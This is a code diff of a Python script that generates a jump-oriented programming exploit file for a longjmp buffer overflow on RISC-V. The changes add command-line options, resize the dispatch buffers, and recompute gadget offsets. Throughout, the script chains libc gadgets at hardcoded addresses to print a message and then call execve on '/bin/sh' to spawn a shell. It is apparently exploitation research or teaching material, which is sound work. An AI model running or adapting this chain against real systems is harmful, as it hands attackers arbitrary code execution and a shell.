@@ -1,3 +1,5 @@
+import argparse
+
 # Abstract buffer class for printing/size
 class buffer:
     def __str__(self):
@@ -49,46 +51,49 @@ class longjmpBuf(buffer):
 # buffer for dispatch/initializer gadget to load registers from
 class dispatchBuf(buffer):
     def __init__(self, buf_ptr):
-        # TODO: it should be possible to shrink the dispatch buf further, at least down to 27 lines instead of 49
-        self.buf = [0 for i in range(49)]
+        self.buf = [0 for i in range(27)]
         if isinstance(buf_ptr, int):
-            self.dispatch_buf = buf_ptr
-            self.next_dispatch_buf = buf_ptr + 392
+            # The gadget loads registers from *(t0+176) through *(t0+392)
+            self.dispatch_buf = buf_ptr - 176
+            # The total number of bytes it reads 216 bytes
+            self.next_dispatch_buf = buf_ptr + self.size()
         else:
-            self.dispatch_buf = buf_ptr.next_dispatch_buf
-            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + 392
-        self.set_s3(self.next_dispatch_buf)
+            self.dispatch_buf = buf_ptr.next_dispatch_buf - 176
+            self.next_dispatch_buf = buf_ptr.next_dispatch_buf + self.size()
+
+        # Point the next t0 to the next buf address minus the 176 byte offset
+        self.set_s3(self.next_dispatch_buf - 176)
     
     def set_t1(self, t1):
-        self.buf[22] = t1
+        self.buf[0] = t1
     def set_ra(self, ra):
-        self.buf[23] = ra
+        self.buf[1] = ra
     def set_sp(self, sp):
-        self.buf[24] = sp 
+        self.buf[2] = sp
     def set_a0(self, a0):
-        self.buf[32] = a0
+        self.buf[10] = a0
     def set_a1(self, a1):
-        self.buf[33] = a1
+        self.buf[11] = a1
     def set_a2(self, a2):
-        self.buf[34] = a2
+        self.buf[12] = a2
     def set_a3(self, a3):
-        self.buf[35] = a3
+        self.buf[13] = a3
     def set_a4(self, a4):
-        self.buf[36] = a4
+        self.buf[14] = a4
     def set_a5(self, a5):
-        self.buf[37] = a5
+        self.buf[15] = a5
     def set_a6(self, a6):
-        self.buf[38] = a6
+        self.buf[16] = a6
     def set_a7(self, a7):
-        self.buf[39] = a7
+        self.buf[17] = a7
     def set_s0(self, s0):
-        self.buf[30] = s0 
+        self.buf[8] = s0
     def set_s1(self, s1):
-        self.buf[31] = s1 
+        self.buf[9] = s1
     def set_s2(self, s2):
-        self.buf[40] = s2 
+        self.buf[18] = s2
     def set_s3(self, s3):
-        self.buf[41] = s3 
+        self.buf[19] = s3
 
 # Helper function to print strings by chaining calls to putchar
 def print_string(string, bufs):
@@ -117,18 +122,21 @@ bin_sh_str = 0x20001178a8
 mv_a0a1a2_jalr_a5 = 0x2000067010
 jalr_a5 = 0x200006701a
 
-# vulnerable buffer size to overflow
-vulnbuf_size = 10000
+# Command line options
+parser = argparse.ArgumentParser(description='Generate JOP exploit file for longjmp buffer overflow')
+parser.add_argument('-o', '--out', type=str, help='output file name', default='dispatch.txt')
+parser.add_argument('-m', '--msg', type=str, help='string to print out', default='RISC-V JOP Success')
+parser.add_argument('--buffer-size', type=int, help='size of buffer to overflow', default=10000)
+parser.add_argument('--buffer-address', type=lambda x: int(x,0), help='size of buffer to overflow', default=0x2aaaaad480)
+args = parser.parse_args()
 
-# vulnerable buffer location in memory
-vuln_buf_ptr = 0x2aaaaad480
-
-dispatch_file = open('dispatch.txt', 'w')
+dispatch_file = open(args.out, 'w')
 
 # Need the actual in-memory address of the dispatchBuf to get started (&f->buffer)
 # Chain gadgets to get some space to reuse as the stack for putchar
 # These can replaced with zero bufs, in which case the JOP chain would start from a later buf
-buf1 = dispatchBuf(vuln_buf_ptr)
+# TODO: try finding a way to increment t0 instead of needing its address - no luck in libc
+buf1 = dispatchBuf(args.buffer_address)
 buf1.set_t1(mv_s3_to_t0_jalr_a3)
 buf1.set_a3(load_regs_from_t0)
 
@@ -139,7 +147,7 @@ buf2.set_a3(load_regs_from_t0)
 bufs = [buf1, buf2]
 
 # Add more dispatch buffers to chain calls to putchar
-print_string('fuck risc-v\n', bufs)
+print_string(args.msg + '\n', bufs)
 
 # Final buffer jumps to execve and executes "/bin/sh"
 final_buf = dispatchBuf(bufs[-1])
@@ -149,18 +157,25 @@ final_buf.set_a2(0)
 final_buf.set_t1(execve)
 bufs.append(final_buf)
 
-# Write out the dispatch buffers to the file and compute their size
-dispatchbufs_size = 0
+# Compute the size of the dispatch buffer and check if they will fit
+dispatchbufs_size = sum(buf.size() for buf in bufs)
+remaining_size = args.buffer_size - dispatchbufs_size
+if remaining_size < 0:
+    print("Vulnerable buffer isn't large enough to run this attack:")
+    print("\tsize of exploit buffer:   ", dispatchbufs_size)
+    print("\tsize of vulnerable buffer:", args.buffer_size)
+    exit(1)
+
+# Write out the dispatch buffers to the file
 for buf in bufs:
     dispatch_file.write(str(buf))
-    dispatchbufs_size += buf.size()
 
 # Fill the remaining part of the vulnerable buffer with zeros
-remaining_size = vulnbuf_size - dispatchbufs_size
 if remaining_size > 0:
     empty_buf = zeroBuf(bytelen=remaining_size)
     dispatch_file.write(str(empty_buf))
 
+# Buffer for registers to be loaded by longjmp
 longjmp = longjmpBuf()
 # s3 is copied to t0 and should point to the first dispatch buf
 longjmp.set_s3(bufs[0].dispatch_buf)
